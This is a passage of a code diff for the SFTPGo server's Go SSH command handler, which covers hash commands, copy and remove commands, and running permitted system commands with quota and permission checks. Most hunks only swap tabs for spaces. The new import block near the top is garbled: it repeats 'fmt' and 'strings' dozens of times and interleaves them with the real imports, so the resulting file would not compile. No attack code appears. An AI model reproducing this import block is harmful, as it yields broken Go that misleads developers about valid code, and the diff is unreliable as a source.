(\n-\t\"crypto/md5\"\n-\t\"crypto/sha1\"\n-\t\"crypto/sha256\"\n-\t\"crypto/sha512\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"hash\"\n-\t\"io\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path\"\n-\t\"runtime/debug\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"time\"\n-\n-\t\"github.com/google/shlex\"\n-\t\"github.com/sftpgo/sdk\"\n-\t\"golang.org/x/crypto/ssh\"\n-\n-\t\"github.com/drakkan/sftpgo/v2/internal/common\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/logger\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/metric\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/util\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/vfs\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+        \"crypto/md5\"\n+        \"crypto/sha1\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"fmt\"\n+\"fmt\"\n+\"fmt\"\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n+\"fmt\"\n+\"fmt\"\n+        \"crypto/sha256\"\n+        \"crypto/sha512\"\n+\"fmt\"\n+        \"errors\"\n+\"strings\"\n+        \"fmt\"\n+        \"hash\"\n+        \"io\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path\"\n+        \"runtime/debug\"\n+        \"strings\"\n+        \"sync\"\n+        \"time\"\n+\n+        \"github.com/google/shlex\"\n+        \"github.com/sftpgo/sdk\"\n+        \"golang.org/x/crypto/ssh\"\n+\n+        \"github.com/drakkan/sftpgo/v2/internal/common\"\n+        \"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n+        \"github.com/drakkan/sftpgo/v2/internal/logger\"\n+        \"github.com/drakkan/sftpgo/v2/internal/metric\"\n+        \"github.com/drakkan/sftpgo/v2/internal/util\"\n+        \"github.com/drakkan/sftpgo/v2/internal/vfs\"\n )\n \n const (\n-\tscpCmdName          = \"scp\"\n-\tsshCommandLogSender = \"SSHCommand\"\n+        scpCmdName          = \"scp\"\n+        sshCommandLogSender = \"SSHCommand\"\n )\n \n var (\n-\terrUnsupportedConfig = errors.New(\"command unsupported for this configuration\")\n+        errUnsupportedConfig = errors.New(\"command unsupported for this configuration\")\n )\n \n type sshCommand struct {\n-\tcommand    string\n-\targs       []string\n-\tconnection *Connection\n-\tstartTime  time.Time\n+        command    string\n+        args       []string\n+        connection *Connection\n+        startTime  time.Time\n }\n \n type systemCommand struct {\n-\tcmd            *exec.Cmd\n-\tfsPath         string\n-\tquotaCheckPath string\n-\tfs             vfs.Fs\n+        cmd            *exec.Cmd\n+        fsPath         string\n+        quotaCheckPath string\n+        fs             vfs.Fs\n }\n \n func (c *systemCommand) GetSTDs() (io.WriteCloser, io.ReadCloser, io.ReadCloser, error) {\n-\tstdin, err := c.cmd.StdinPipe()\n-\tif err != nil {\n-\t\treturn nil, nil, nil, err\n-\t}\n-\tstdout, err := c.cmd.StdoutPipe()\n-\tif err != nil {\n-\t\tstdin.Close()\n-\t\treturn nil, nil, nil, err\n-\t}\n-\tstderr, err := c.cmd.StderrPipe()\n-\tif err != nil {\n-\t\tstdin.Close()\n-\t\tstdout.Close()\n-\t\treturn nil, nil, nil, err\n-\t}\n-\treturn stdin, stdout, stderr, nil\n+        stdin, err := c.cmd.StdinPipe()\n+        if err != nil {\n+                return nil, nil, nil, err\n+        }\n+        stdout, err := c.cmd.StdoutPipe()\n+        if err != nil {\n+                stdin.Close()\n+                return nil, nil, nil, err\n+        }\n+        stderr, err := c.cmd.StderrPipe()\n+        if err != nil {\n+                stdin.Close()\n+                stdout.Close()\n+                return nil, nil, nil, err\n+        }\n+        return stdin, stdout, stderr, nil\n }\n \n func processSSHCommand(payload []byte, connection *Connection, enabledSSHCommands []string) bool {\n-\tvar msg sshSubsystemExecMsg\n-\tif err := ssh.Unmarshal(payload, &msg); err == nil {\n-\t\tname, args, err := parseCommandPayload(msg.Command)\n-\t\tconnection.Log(logger.LevelDebug, \"new ssh command: %q args: %v num args: %d user: %s, error: %v\",\n-\t\t\tname, args, len(args), connection.User.Username, err)\n-\t\tif err == nil && util.Contains(enabledSSHCommands, name) {\n-\t\t\tconnection.command = msg.Command\n-\t\t\tif name == scpCmdName && len(args) >= 2 {\n-\t\t\t\tconnection.SetProtocol(common.ProtocolSCP)\n-\t\t\t\tscpCommand := scpCommand{\n-\t\t\t\t\tsshCommand: sshCommand{\n-\t\t\t\t\t\tcommand:    name,\n-\t\t\t\t\t\tconnection: connection,\n-\t\t\t\t\t\tstartTime:  time.Now(),\n-\t\t\t\t\t\targs:       args},\n-\t\t\t\t}\n-\t\t\t\tgo scpCommand.handle() //nolint:errcheck\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t\tif name != scpCmdName {\n-\t\t\t\tconnection.SetProtocol(common.ProtocolSSH)\n-\t\t\t\tsshCommand := sshCommand{\n-\t\t\t\t\tcommand:    name,\n-\t\t\t\t\tconnection: connection,\n-\t\t\t\t\tstartTime:  time.Now(),\n-\t\t\t\t\targs:       args,\n-\t\t\t\t}\n-\t\t\t\tgo sshCommand.handle() //nolint:errcheck\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t} else {\n-\t\t\tconnection.Log(logger.LevelInfo, \"ssh command not enabled/supported: %q\", name)\n-\t\t}\n-\t}\n-\terr := connection.CloseFS()\n-\tconnection.Log(logger.LevelError, \"unable to unmarshal ssh command, close fs, err: %v\", err)\n-\treturn false\n+        var msg sshSubsystemExecMsg\n+        if err := ssh.Unmarshal(payload, &msg); err == nil {\n+                name, args, err := parseCommandPayload(msg.Command)\n+                connection.Log(logger.LevelDebug, \"new ssh command: %q args: %v num args: %d user: %s, error: %v\",\n+                        name, args, len(args), connection.User.Username, err)\n+                if err == nil && util.Contains(enabledSSHCommands, name) {\n+                        connection.command = msg.Command\n+                        if name == scpCmdName && len(args) >= 2 {\n+                                connection.SetProtocol(common.ProtocolSCP)\n+                                scpCommand := scpCommand{\n+                                        sshCommand: sshCommand{\n+                                                command:    name,\n+                                                connection: connection,\n+                                                startTime:  time.Now(),\n+                                                args:       args},\n+                                }\n+                                go scpCommand.handle() //nolint:errcheck\n+                                return true\n+                        }\n+                        if name != scpCmdName {\n+                                connection.SetProtocol(common.ProtocolSSH)\n+                                sshCommand := sshCommand{\n+                                        command:    name,\n+                                        connection: connection,\n+                                        startTime:  time.Now(),\n+                                        args:       args,\n+                                }\n+                                go sshCommand.handle() //nolint:errcheck\n+                                return true\n+                        }\n+                } else {\n+                        connection.Log(logger.LevelInfo, \"ssh command not enabled/supported: %q\", name)\n+                }\n+        }\n+        err := connection.CloseFS()\n+        connection.Log(logger.LevelError, \"unable to unmarshal ssh command, close fs, err: %v\", err)\n+        return false\n }\n \n func (c *sshCommand) handle() (err error) {\n-\tdefer func() {\n-\t\tif r := recover(); r != nil {\n-\t\t\tlogger.Error(logSender, \"\", \"panic in handle ssh command: %q stack trace: %v\", r, string(debug.Stack()))\n-\t\t\terr = common.ErrGenericFailure\n-\t\t}\n-\t}()\n-\tif err := common.Connections.Add(c.connection); err != nil {\n-\t\tlogger.Info(logSender, \"\", \"unable to add SSH command connection: %v\", err)\n-\t\treturn err\n-\t}\n-\tdefer common.Connections.Remove(c.connection.GetID())\n-\n-\tc.connection.UpdateLastActivity()\n-\tif util.Contains(sshHashCommands, c.command) {\n-\t\treturn c.handleHashCommands()\n-\t} else if util.Contains(systemCommands, c.command) {\n-\t\tcommand, err := c.getSystemCommand()\n-\t\tif err != nil {\n-\t\t\treturn c.sendErrorResponse(err)\n-\t\t}\n-\t\treturn c.executeSystemCommand(command)\n-\t} else if c.command == \"cd\" {\n-\t\tc.sendExitStatus(nil)\n-\t} else if c.command == \"pwd\" {\n-\t\t// hard coded response to the start directory\n-\t\tc.connection.channel.Write([]byte(util.CleanPath(c.connection.User.Filters.StartDirectory) + \"\\n\")) //nolint:errcheck\n-\t\tc.sendExitStatus(nil)\n-\t} else if c.command == \"sftpgo-copy\" {\n-\t\treturn c.handleSFTPGoCopy()\n-\t} else if c.command == \"sftpgo-remove\" {\n-\t\treturn c.handleSFTPGoRemove()\n-\t}\n-\treturn\n+        defer func() {\n+                if r := recover(); r != nil {\n+                        logger.Error(logSender, \"\", \"panic in handle ssh command: %q stack trace: %v\", r, string(debug.Stack()))\n+                        err = common.ErrGenericFailure\n+                }\n+        }()\n+        if err := common.Connections.Add(c.connection); err != nil {\n+                logger.Info(logSender, \"\", \"unable to add SSH command connection: %v\", err)\n+                return err\n+        }\n+        defer common.Connections.Remove(c.connection.GetID())\n+\n+        c.connection.UpdateLastActivity()\n+        if util.Contains(sshHashCommands, c.command) {\n+                return c.handleHashCommands()\n+        } else if util.Contains(systemCommands, c.command) {\n+                command, err := c.getSystemCommand()\n+                if err != nil {\n+                        return c.sendErrorResponse(err)\n+                }\n+                return c.executeSystemCommand(command)\n+        } else if c.command == \"cd\" {\n+                c.sendExitStatus(nil)\n+        } else if c.command == \"pwd\" {\n+                // hard coded response to the start directory\n+                c.connection.channel.Write([]byte(util.CleanPath(c.connection.User.Filters.StartDirectory) + \"\\n\")) //nolint:errcheck\n+                c.sendExitStatus(nil)\n+        } else if c.command == \"sftpgo-copy\" {\n+                return c.handleSFTPGoCopy()\n+        } else if c.command == \"sftpgo-remove\" {\n+                return c.handleSFTPGoRemove()\n+        }\n+        return\n }\n \n func (c *sshCommand) handleSFTPGoCopy() error {\n-\tsshSourcePath := c.getSourcePath()\n-\tsshDestPath := c.getDestPath()\n-\tif sshSourcePath == \"\" || sshDestPath == \"\" || len(c.args) != 2 {\n-\t\treturn c.sendErrorResponse(errors.New(\"usage sftpgo-copy <source dir path> <destination dir path>\"))\n-\t}\n-\tc.connection.Log(logger.LevelDebug, \"requested copy %q -> %q\", sshSourcePath, sshDestPath)\n-\tif err := c.connection.Copy(sshSourcePath, sshDestPath); err != nil {\n-\t\treturn c.sendErrorResponse(err)\n-\t}\n-\tc.connection.channel.Write([]byte(\"OK\\n\")) //nolint:errcheck\n-\tc.sendExitStatus(nil)\n-\treturn nil\n+        sshSourcePath := c.getSourcePath()\n+        sshDestPath := c.getDestPath()\n+        if sshSourcePath == \"\" || sshDestPath == \"\" || len(c.args) != 2 {\n+                return c.sendErrorResponse(errors.New(\"usage sftpgo-copy <source dir path> <destination dir path>\"))\n+        }\n+        c.connection.Log(logger.LevelDebug, \"requested copy %q -> %q\", sshSourcePath, sshDestPath)\n+        if err := c.connection.Copy(sshSourcePath, sshDestPath); err != nil {\n+                return c.sendErrorResponse(err)\n+        }\n+        c.connection.channel.Write([]byte(\"OK\\n\")) //nolint:errcheck\n+        c.sendExitStatus(nil)\n+        return nil\n }\n \n func (c *sshCommand) handleSFTPGoRemove() error {\n-\tsshDestPath, err := c.getRemovePath()\n-\tif err != nil {\n-\t\treturn c.sendErrorResponse(err)\n-\t}\n-\tif err := c.connection.RemoveAll(sshDestPath); err != nil {\n-\t\treturn c.sendErrorResponse(err)\n-\t}\n-\tc.connection.channel.Write([]byte(\"OK\\n\")) //nolint:errcheck\n-\tc.sendExitStatus(nil)\n-\treturn nil\n+        sshDestPath, err := c.getRemovePath()\n+        if err != nil {\n+                return c.sendErrorResponse(err)\n+        }\n+        if err := c.connection.RemoveAll(sshDestPath); err != nil {\n+                return c.sendErrorResponse(err)\n+        }\n+        c.connection.channel.Write([]byte(\"OK\\n\")) //nolint:errcheck\n+        c.sendExitStatus(nil)\n+        return nil\n }\n \n func (c *sshCommand) updateQuota(sshDestPath string, filesNum int, filesSize int64) {\n-\tvfolder, err := c.connection.User.GetVirtualFolderForPath(sshDestPath)\n-\tif err == nil {\n-\t\tdataprovider.UpdateVirtualFolderQuota(&vfolder.BaseVirtualFolder, filesNum, filesSize, false) //nolint:errcheck\n-\t\tif vfolder.IsIncludedInUserQuota() {\n-\t\t\tdataprovider.UpdateUserQuota(&c.connection.User, filesNum, filesSize, false) //nolint:errcheck\n-\t\t}\n-\t} else {\n-\t\tdataprovider.UpdateUserQuota(&c.connection.User, filesNum, filesSize, false) //nolint:errcheck\n-\t}\n+        vfolder, err := c.connection.User.GetVirtualFolderForPath(sshDestPath)\n+        if err == nil {\n+                dataprovider.UpdateVirtualFolderQuota(&vfolder.BaseVirtualFolder, filesNum, filesSize, false) //nolint:errcheck\n+                if vfolder.IsIncludedInUserQuota() {\n+                        dataprovider.UpdateUserQuota(&c.connection.User, filesNum, filesSize, false) //nolint:errcheck\n+                }\n+        } else {\n+                dataprovider.UpdateUserQuota(&c.connection.User, filesNum, filesSize, false) //nolint:errcheck\n+        }\n }\n \n func (c *sshCommand) handleHashCommands() error {\n-\tvar h hash.Hash\n-\tif c.command == \"md5sum\" {\n-\t\th = md5.New()\n-\t} else if c.command == \"sha1sum\" {\n-\t\th = sha1.New()\n-\t} else if c.command == \"sha256sum\" {\n-\t\th = sha256.New()\n-\t} else if c.command == \"sha384sum\" {\n-\t\th = sha512.New384()\n-\t} else {\n-\t\th = sha512.New()\n-\t}\n-\tvar response string\n-\tif len(c.args) == 0 {\n-\t\t// without args we need to read the string to hash from stdin\n-\t\tbuf := make([]byte, 4096)\n-\t\tn, err := c.connection.channel.Read(buf)\n-\t\tif err != nil && err != io.EOF {\n-\t\t\treturn c.sendErrorResponse(err)\n-\t\t}\n-\t\th.Write(buf[:n]) //nolint:errcheck\n-\t\tresponse = fmt.Sprintf(\"%x  -\\n\", h.Sum(nil))\n-\t} else {\n-\t\tsshPath := c.getDestPath()\n-\t\tif ok, policy := c.connection.User.IsFileAllowed(sshPath); !ok {\n-\t\t\tc.connection.Log(logger.LevelInfo, \"hash not allowed for file %q\", sshPath)\n-\t\t\treturn c.sendErrorResponse(c.connection.GetErrorForDeniedFile(policy))\n-\t\t}\n-\t\tfs, fsPath, err := c.connection.GetFsAndResolvedPath(sshPath)\n-\t\tif err != nil {\n-\t\t\treturn c.sendErrorResponse(err)\n-\t\t}\n-\t\tif !c.connection.User.HasPerm(dataprovider.PermListItems, sshPath) {\n-\t\t\treturn c.sendErrorResponse(c.connection.GetPermissionDeniedError())\n-\t\t}\n-\t\thash, err := c.computeHashForFile(fs, h, fsPath)\n-\t\tif err != nil {\n-\t\t\treturn c.sendErrorResponse(c.connection.GetFsError(fs, err))\n-\t\t}\n-\t\tresponse = fmt.Sprintf(\"%v  %v\\n\", hash, sshPath)\n-\t}\n-\tc.connection.channel.Write([]byte(response)) //nolint:errcheck\n-\tc.sendExitStatus(nil)\n-\treturn nil\n+        var h hash.Hash\n+        if c.command == \"md5sum\" {\n+                h = md5.New()\n+        } else if c.command == \"sha1sum\" {\n+                h = sha1.New()\n+        } else if c.command == \"sha256sum\" {\n+                h = sha256.New()\n+        } else if c.command == \"sha384sum\" {\n+                h = sha512.New384()\n+        } else {\n+                h = sha512.New()\n+        }\n+        var response string\n+        if len(c.args) == 0 {\n+                // without args we need to read the string to hash from stdin\n+                buf := make([]byte, 4096)\n+                n, err := c.connection.channel.Read(buf)\n+                if err != nil && err != io.EOF {\n+                        return c.sendErrorResponse(err)\n+                }\n+                h.Write(buf[:n]) //nolint:errcheck\n+                response = fmt.Sprintf(\"%x  -\\n\", h.Sum(nil))\n+        } else {\n+                sshPath := c.getDestPath()\n+                if ok, policy := c.connection.User.IsFileAllowed(sshPath); !ok {\n+                        c.connection.Log(logger.LevelInfo, \"hash not allowed for file %q\", sshPath)\n+                        return c.sendErrorResponse(c.connection.GetErrorForDeniedFile(policy))\n+                }\n+                fs, fsPath, err := c.connection.GetFsAndResolvedPath(sshPath)\n+                if err != nil {\n+                        return c.sendErrorResponse(err)\n+                }\n+                if !c.connection.User.HasPerm(dataprovider.PermListItems, sshPath) {\n+                        return c.sendErrorResponse(c.connection.GetPermissionDeniedError())\n+                }\n+                hash, err := c.computeHashForFile(fs, h, fsPath)\n+                if err != nil {\n+                        return c.sendErrorResponse(c.connection.GetFsError(fs, err))\n+                }\n+                response = fmt.Sprintf(\"%v  %v\\n\", hash, sshPath)\n+        }\n+        c.connection.channel.Write([]byte(response)) //nolint:errcheck\n+        c.sendExitStatus(nil)\n+        return nil\n }\n \n func (c *sshCommand) executeSystemCommand(command systemCommand) error {\n-\tsshDestPath := c.getDestPath()\n-\tif !c.isLocalPath(sshDestPath) {\n-\t\treturn c.sendErrorResponse(errUnsupportedConfig)\n-\t}\n-\tdiskQuota, transferQuota := c.connection.HasSpace(true, false, command.quotaCheckPath)\n-\tif !diskQuota.HasSpace || !transferQuota.HasUploadSpace() || !transferQuota.HasDownloadSpace() {\n-\t\treturn c.sendErrorResponse(common.ErrQuotaExceeded)\n-\t}\n-\tperms := []string{dataprovider.PermDownload, dataprovider.PermUpload, dataprovider.PermCreateDirs, dataprovider.PermListItems,\n-\t\tdataprovider.PermOverwrite, dataprovider.PermDelete}\n-\tif !c.connection.User.HasPerms(perms, sshDestPath) {\n-\t\treturn c.sendErrorResponse(c.connection.GetPermissionDeniedError())\n-\t}\n-\n-\tinitialFiles, initialSize, err := c.getSizeForPath(command.fs, command.fsPath)\n-\tif err != nil {\n-\t\treturn c.sendErrorResponse(err)\n-\t}\n-\n-\tstdin, stdout, stderr, err := command.GetSTDs()\n-\tif err != nil {\n-\t\treturn c.sendErrorResponse(err)\n-\t}\n-\terr = command.cmd.Start()\n-\tif err != nil {\n-\t\treturn c.sendErrorResponse(err)\n-\t}\n-\n-\tcloseCmdOnError := func() {\n-\t\tc.connection.Log(logger.LevelDebug, \"kill cmd: %q and close ssh channel after read or write error\",\n-\t\t\tc.connection.command)\n-\t\tkillerr := command.cmd.Process.Kill()\n-\t\tcloserr := c.connection.channel.Close()\n-\t\tc.connection.Log(logger.LevelDebug, \"kill cmd error: %v close channel error: %v\", killerr, closerr)\n-\t}\n-\tvar once sync.Once\n-\tcommandResponse := make(chan bool)\n-\n-\tremainingQuotaSize := diskQuota.GetRemainingSize()\n-\n-\tgo func() {\n-\t\tdefer stdin.Close()\n-\t\tbaseTransfer := common.NewBaseTransfer(nil, c.connection.BaseConnection, nil, command.fsPath, command.fsPath, sshDestPath,\n-\t\t\tcommon.TransferUpload, 0, 0, remainingQuotaSize, 0, false, command.fs, transferQuota)\n-\t\ttransfer := newTransfer(baseTransfer, nil, nil, nil)\n-\n-\t\tw, e := transfer.copyFromReaderToWriter(stdin, c.connection.channel)\n-\t\tc.connection.Log(logger.LevelDebug, \"command: %q, copy from remote command to sdtin ended, written: %v, \"+\n-\t\t\t\"initial remaining quota: %v, err: %v\", c.connection.command, w, remainingQuotaSize, e)\n-\t\tif e != nil {\n-\t\t\tonce.Do(closeCmdOnError)\n-\t\t}\n-\t}()\n-\n-\tgo func() {\n-\t\tbaseTransfer := common.NewBaseTransfer(nil, c.connection.BaseConnection, nil, command.fsPath, command.fsPath, sshDestPath,\n-\t\t\tcommon.TransferDownload, 0, 0, 0, 0, false, command.fs, transferQuota)\n-\t\ttransfer := newTransfer(baseTransfer, nil, nil, nil)\n-\n-\t\tw, e := transfer.copyFromReaderToWriter(c.connection.channel, stdout)\n-\t\tc.connection.Log(logger.LevelDebug, \"command: %q, copy from sdtout to remote command ended, written: %v err: %v\",\n-\t\t\tc.connection.command, w, e)\n-\t\tif e != nil {\n-\t\t\tonce.Do(closeCmdOnError)\n-\t\t}\n-\t\tcommandResponse <- true\n-\t}()\n-\n-\tgo func() {\n-\t\tbaseTransfer := common.NewBaseTransfer(nil, c.connection.BaseConnection, nil, command.fsPath, command.fsPath, sshDestPath,\n-\t\t\tcommon.TransferDownload, 0, 0, 0, 0, false, command.fs, transferQuota)\n-\t\ttransfer := newTransfer(baseTransfer, nil, nil, nil)\n-\n-\t\tw, e := transfer.copyFromReaderToWriter(c.connection.channel.(ssh.Channel).Stderr(), stderr)\n-\t\tc.connection.Log(logger.LevelDebug, \"command: %q, copy from sdterr to remote command ended, written: %v err: %v\",\n-\t\t\tc.connection.command, w, e)\n-\t\t// os.ErrClosed means that the command is finished so we don't need to do anything\n-\t\tif (e != nil && !errors.Is(e, os.ErrClosed)) || w > 0 {\n-\t\t\tonce.Do(closeCmdOnError)\n-\t\t}\n-\t}()\n-\n-\t<-commandResponse\n-\terr = command.cmd.Wait()\n-\tc.sendExitStatus(err)\n-\n-\tnumFiles, dirSize, errSize := c.getSizeForPath(command.fs, command.fsPath)\n-\tif errSize == nil {\n-\t\tc.updateQuota(sshDestPath, numFiles-initialFiles, dirSize-initialSize)\n-\t}\n-\tc.connection.Log(logger.LevelDebug, \"command %q finished for path %q, initial files %v initial size %v \"+\n-\t\t\"current files %v current size %v size err: %v\", c.connection.command, command.fsPath, initialFiles, initialSize,\n-\t\tnumFiles, dirSize, errSize)\n-\treturn c.connection.GetFsError(command.fs, err)\n+        sshDestPath := c.getDestPath()\n+        if !c.isLocalPath(sshDestPath) {\n+                return c.sendErrorResponse(errUnsupportedConfig)\n+        }\n+        diskQuota, transferQuota := c.connection.HasSpace(true, false, command.quotaCheckPath)\n+        if !diskQuota.HasSpace || !transferQuota.HasUploadSpace() || !transferQuota.HasDownloadSpace() {\n+                return c.sendErrorResponse(common.ErrQuotaExceeded)\n+        }\n+        perms := []string{dataprovider.PermDownload, dataprovider.PermUpload, dataprovider.PermCreateDirs, dataprovider.PermListItems,\n+                dataprovider.PermOverwrite, dataprovider.PermDelete}\n+        if !c.connection.User.HasPerms(perms, sshDestPath) {\n+                return c.sendErrorResponse(c.connection.GetPermissionDeniedError())\n+        }\n+\n+        initialFiles, initialSize, err := c.getSizeForPath(command.fs, command.fsPath)\n+        if err != nil {\n+                return c.sendErrorResponse(err)\n+        }\n+\n+        stdin, stdout, stderr, err := command.GetSTDs()\n+        if err != nil {\n+                return c.sendErrorResponse(err)\n+        }\n+        err = command.cmd.Start()\n+        if err != nil {\n+                return c.sendErrorResponse(err)\n+        }\n+\n+        closeCmdOnError := func() {\n+                c.connection.Log(logger.LevelDebug, \"kill cmd: %q and close ssh channel after read or write error\",\n+                        c.connection.command)\n+                killerr := command.cmd.Process.Kill()\n+                closerr := c.connection.channel.Close()\n+                c.connection.Log(logger.LevelDebug, \"kill cmd error: %v close channel error: %v\", killerr, closerr)\n+        }\n+        var once sync.Once\n+        commandResponse := make(chan bool)\n+\n+        remainingQuotaSize := diskQuota.GetRemainingSize()\n+\n+        go func() {\n+                defer stdin.Close()\n+                baseTransfer := common.NewBaseTransfer(nil, c.connection.BaseConnection, nil, command.fsPath, command.fsPath, sshDestPath,\n+                        common.TransferUpload, 0, 0, remainingQuotaSize, 0, false, command.fs, transferQuota)\n+                transfer := newTransfer(baseTransfer, nil, nil, nil)\n+\n+                w, e := transfer.copyFromReaderToWriter(stdin, c.connection.channel)\n+                c.connection.Log(logger.LevelDebug, \"command: %q, copy from remote command to sdtin ended, written: %v, \"+\n+                        \"initial remaining quota: %v, err: %v\", c.connection.command, w, remainingQuotaSize, e)\n+                if e != nil {\n+                        once.Do(closeCmdOnError)\n+                }\n+        }()\n+\n+        go func() {\n+                baseTransfer := common.NewBaseTransfer(nil, c.connection.BaseConnection, nil, command.fsPath, command.fsPath, sshDestPath,\n+                        common.TransferDownload, 0, 0, 0, 0, false, command.fs, transferQuota)\n+                transfer := newTransfer(baseTransfer, nil, nil, nil)\n+\n+                w, e := transfer.copyFromReaderToWriter(c.connection.channel, stdout)\n+                c.connection.Log(logger.LevelDebug, \"command: %q, copy from sdtout to remote command ended, written: %v err: %v\",\n+                        c.connection.command, w, e)\n+                if e != nil {\n+                        once.Do(closeCmdOnError)\n+                }\n+                commandResponse <- true\n+        }()\n+\n+        go func() {\n+                baseTransfer := common.NewBaseTransfer(nil, c.connection.BaseConnection, nil, command.fsPath, command.fsPath, sshDestPath,\n+                        common.TransferDownload, 0, 0, 0, 0, false, command.fs, transferQuota)\n+                transfer := newTransfer(baseTransfer, nil, nil, nil)\n+\n+                w, e := transfer.copyFromReaderToWriter(c.connection.channel.(ssh.Channel).Stderr(), stderr)\n+                c.connection.Log(logger.LevelDebug, \"command: %q, copy from sdterr to remote command ended, written: %v err: %v\",\n+                        c.connection.command, w, e)\n+                // os.ErrClosed means that the command is finished so we don't need to do anything\n+                if (e != nil && !errors.Is(e, os.ErrClosed)) || w > 0 {\n+                        once.Do(closeCmdOnError)\n+                }\n+        }()\n+\n+        <-commandResponse\n+        err = command.cmd.Wait()\n+        c.sendExitStatus(err)\n+\n+        numFiles, dirSize, errSize := c.getSizeForPath(command.fs, command.fsPath)\n+        if errSize == nil {\n+                c.updateQuota(sshDestPath, numFiles-initialFiles, dirSize-initialSize)\n+        }\n+        c.connection.Log(logger.LevelDebug, \"command %q finished for path %q, initial files %v initial size %v \"+\n+                \"current files %v current size %v size err: %v\", c.connection.command, command.fsPath, initialFiles, initialSize,\n+                numFiles, dirSize, errSize)\n+        return c.connection.GetFsError(command.fs, err)\n }\n \n func (c *sshCommand) isSystemCommandAllowed() error {\n-\tsshDestPath := c.getDestPath()\n-\tif c.connection.User.IsVirtualFolder(sshDestPath) {\n-\t\t// overlapped virtual path are not allowed\n-\t\treturn nil\n-\t}\n-\tif c.connection.User.HasVirtualFoldersInside(sshDestPath) {\n-\t\tc.connection.Log(logger.LevelDebug, \"command %q is not allowed, path %q has virtual folders inside it, user %q\",\n-\t\t\tc.command, sshDestPath, c.connection.User.Username)\n-\t\treturn errUnsupportedConfig\n-\t}\n-\tfor _, f := range c.connection.User.Filters.FilePatterns {\n-\t\tif f.Path == sshDestPath {\n-\t\t\tc.connection.Log(logger.LevelDebug,\n-\t\t\t\t\"command %q is not allowed inside folders with file patterns filters %q user %q\",\n-\t\t\t\tc.command, sshDestPath, c.connection.User.Username)\n-\t\t\treturn errUnsupportedConfig\n-\t\t}\n-\t\tif len(sshDestPath) > len(f.Path) {\n-\t\t\tif strings.HasPrefix(sshDestPath, f.Path+\"/\") || f.Path == \"/\" {\n-\t\t\t\tc.connection.Log(logger.LevelDebug,\n-\t\t\t\t\t\"command %q is not allowed it includes folders with file patterns filters %q user %q\",\n-\t\t\t\t\tc.command, sshDestPath, c.connection.User.Username)\n-\t\t\t\treturn errUnsupportedConfig\n-\t\t\t}\n-\t\t}\n-\t\tif len(sshDestPath) < len(f.Path) {\n-\t\t\tif strings.HasPrefix(sshDestPath+\"/\", f.Path) || sshDestPath == \"/\" {\n-\t\t\t\tc.connection.Log(logger.LevelDebug,\n-\t\t\t\t\t\"command %q is not allowed inside folder with file patterns filters %q user %q\",\n-\t\t\t\t\tc.command, sshDestPath, c.connection.User.Username)\n-\t\t\t\treturn errUnsupportedConfig\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn nil\n+        sshDestPath := c.getDestPath()\n+        if c.connection.User.IsVirtualFolder(sshDestPath) {\n+                // overlapped virtual path are not allowed\n+                return nil\n+        }\n+        if c.connection.User.HasVirtualFoldersInside(sshDestPath) {\n+                c.connection.Log(logger.LevelDebug, \"command %q is not allowed, path %q has virtual folders inside it, user %q\",\n+                        c.command, sshDestPath, c.connection.User.Username)\n+                return errUnsupportedConfig\n+        }\n+        for _, f := range c.connection.User.Filters.FilePatterns {\n+                if f.Path == sshDestPath {\n+                        c.connection.Log(logger.LevelDebug,\n+                                \"command %q is not allowed inside folders with file patterns filters %q user %q\",\n+                                c.command, sshDestPath, c.connection.User.Username)\n+                        return errUnsupportedConfig\n+                }\n+                if len(sshDestPath) > len(f.Path) {\n+                        if strings.HasPrefix(sshDestPath, f.Path+\"/\") || f.Path == \"/\" {\n+                                c.connection.Log(logger.LevelDebug,\n+                                        \"command %q is not allowed it includes folders with file patterns filters %q user %q\",\n+                                        c.command, sshDestPath, c.connection.User.Username)\n+                                return errUnsupportedConfig\n+                        }\n+                }\n+                if len(sshDestPath) < len(f.Path) {\n+                        if strings.HasPrefix(sshDestPath+\"/\", f.Path) || sshDestPath == \"/\" {\n+                                c.connection.Log(logger.LevelDebug,\n+                                        \"command %q is not allowed inside folder with file patterns filters %q user %q\",\n+                                        c.command, sshDestPath, c.connection.User.Username)\n+                                return errUnsupportedConfig\n+                        }\n+                }\n+        }\n+        return nil\n }\n \n func (c *sshCommand) getSystemCommand() (systemCommand, error) {\n-\tcommand := systemCommand{\n-\t\tcmd:            nil,\n-\t\tfs:             nil,\n-\t\tfsPath:         \"\",\n-\t\tquotaCheckPath: \"\",\n-\t}\n-\tif err := common.CheckClosing(); err != nil {\n-\t\treturn command, err\n-\t}\n-\targs := make([]string, len(c.args))\n-\tcopy(args, c.args)\n-\tvar fsPath, quotaPath string\n-\tsshPath := c.getDestPath()\n-\tfs, err := c.connection.User.GetFilesystemForPath(sshPath, c.connection.ID)\n-\tif err != nil {\n-\t\treturn command, err\n-\t}\n-\tif len(c.args) > 0 {\n-\t\tvar err error\n-\t\tfsPath, err = fs.ResolvePath(sshPath)\n-\t\tif err != nil {\n-\t\t\treturn command, c.connection.GetFsError(fs, err)\n-\t\t}\n-\t\tquotaPath = sshPath\n-\t\tfi, err := fs.Stat(fsPath)\n-\t\tif err == nil && fi.IsDir() {\n-\t\t\t// if the target is an existing dir the command will write inside this dir\n-\t\t\t// so we need to check the quota for this directory and not its parent dir\n-\t\t\tquotaPath = path.Join(sshPath, \"fakecontent\")\n-\t\t}\n-\t\tif strings.HasSuffix(sshPath, \"/\") && 